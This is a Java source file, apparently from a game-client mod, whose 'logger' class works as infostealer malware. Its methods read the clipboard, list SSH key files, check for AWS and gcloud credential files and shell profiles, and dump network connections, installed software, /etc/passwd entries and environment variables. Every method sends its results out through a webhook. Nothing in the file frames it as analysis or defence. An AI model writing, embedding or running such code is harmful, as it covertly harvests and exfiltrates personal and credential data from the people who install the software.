package treacherousswine.doomix.client.logger;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

public class sewagedwelling {
    
    public static void logClipboardContent() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"xclip", "-selection", "clipboard", "-o"});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder clipboard = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                clipboard.append(line).append("\n");
                if (clipboard.length() > 500) break;
            }
            reader.close();
            if (clipboard.length() > 0) {
                Logger.sendWebhookMessage(" **example**\n```\n" + clipboard.toString() + "\n```");
            }
        } catch (Exception e) {
            // windows fallback
        }
    }
    
    public static void logSSHKeys() {
        try {
            String homeDir = System.getProperty("user.home");
            Path sshDir = Paths.get(homeDir, ".ssh");
            if (Files.exists(sshDir)) {
                Files.list(sshDir)
                    .filter(p -> p.getFileName().toString().contains("id_") || p.getFileName().toString().contains("key"))
                    .forEach(p -> {
                        try {
                            Logger.sendWebhookMessage(" **example:** " + p.getFileName());
                        } catch (Exception e) {}
                    });
            }
        } catch (Exception e) {}
    }
    
    public static void logAPIKeys() {
        try {
            String homeDir = System.getProperty("user.home");
            String[] keyFiles = {
                homeDir + "/.aws/credentials",
                homeDir + "/.aws/config",
                homeDir + "/.config/gcloud/properties",
                homeDir + "/.env",
                homeDir + "/.bash_profile",
                homeDir + "/.bashrc",
                homeDir + "/.zshrc"
            };
            
            for (String keyFile : keyFiles) {
                Path p = Paths.get(keyFile);
                if (Files.exists(p)) {
                    Logger.sendWebhookMessage(" **ouch:** " + keyFile);
                }
            }
        } catch (Exception e) {}
    }
    
    public static void logNetworkConnections() {
        try {
            ProcessBuilder pb;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("windows")) {
                pb = new ProcessBuilder("netstat", "-an");
            } else {
                pb = new ProcessBuilder("netstat", "-tunap");
            }
            
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder netInfo = new StringBuilder(" **brownie scared**\n```\n");
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 15) {
                if (line.contains("ESTABLISHED") || line.contains("LISTEN")) {
                    netInfo.append(line).append("\n");
                    count++;
                }
            }
            reader.close();
            netInfo.append("```");
            Logger.sendWebhookMessage(netInfo.toString());
        } catch (Exception e) {}
    }
    
    public static void logInstalledSoftware() {
        try {
            StringBuilder softInfo = new StringBuilder(" **example**\n```\n");
            ProcessBuilder pb;
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                pb = new ProcessBuilder("dpkg", "-l");
            } else if (os.contains("windows")) {
                pb = new ProcessBuilder("powershell", "-Command", "Get-WmiObject Win32_Product | select Name");
            } else {
                return;
            }
            
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 20) {
                softInfo.append(line).append("\n");
                count++;
            }
            reader.close();
            softInfo.append("```");
            Logger.sendWebhookMessage(softInfo.toString());
        } catch (Exception e) {}
    }
    
    public static void logGPUInfo() {
        try {
            ProcessBuilder pb;
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                pb = new ProcessBuilder("lspci");
            } else if (os.contains("windows")) {
                pb = new ProcessBuilder("powershell", "-Command", "Get-WmiObject Win32_VideoController | select Name, DriverVersion");
            } else {
                return;
            }
            
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder gpuInfo = new StringBuilder(" **example**\n```\n");
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 10) {
                if (line.toLowerCase().contains("nvidia") || line.toLowerCase().contains("amd") || 
                    line.toLowerCase().contains("intel") || line.toLowerCase().contains("video")) {
                    gpuInfo.append(line).append("\n");
                    count++;
                }
            }
            reader.close();
            gpuInfo.append("```");
            Logger.sendWebhookMessage(gpuInfo.toString());
        } catch (Exception e) {}
    }
    
    public static void logDatabaseFiles() {
        try {
            String homeDir = System.getProperty("user.home");
            String[] dbPaths = {
                homeDir + "/.local/share/evolution/calendar",
                homeDir + "/.config/evolution/sources",
                homeDir + "/Dropbox",
                homeDir + "/.config/syncthing"
            };
            
            StringBuilder dbInfo = new StringBuilder(" **example**\n```\n");
            for (String dbPath : dbPaths) {
                Path p = Paths.get(dbPath);
                if (Files.exists(p)) {
                    dbInfo.append("found: ").append(dbPath).append("\n");
                }
            }
            dbInfo.append("```");
            Logger.sendWebhookMessage(dbInfo.toString());
        } catch (Exception e) {}
    }
    
    public static void logUserAccounts() {
        try {
            StringBuilder userInfo = new StringBuilder(" **example**\n```\n");
            userInfo.append("current user: ").append(System.getProperty("user.name")).append("\n");
            userInfo.append("user home: ").append(System.getProperty("user.home")).append("\n");
            
            ProcessBuilder pb;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("linux")) {
                pb = new ProcessBuilder("cat", "/etc/passwd");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 10) {
                    userInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            }
            
            userInfo.append("```");
            Logger.sendWebhookMessage(userInfo.toString());
        } catch (Exception e) {}
    }
    
    public static void logEnvironmentVariables() {
        try {
            StringBuilder envInfo = new StringBuilder(" **example**\n```\n");
            System.getenv().forEach((key, value) -> {
                if (key.contains("HOME") || key.contains("USER") || key.contains("PATH") ||
                    key.contains("SHELL") || key.contains("LANG")) {
                    envInfo.append(key).append("=").append(value).append("\n");
                }
            });
            envInfo.append("```");
            Logger.sendWebhookMessage(envInfo.toString());
        } catch (Exception e) {}
    }
}
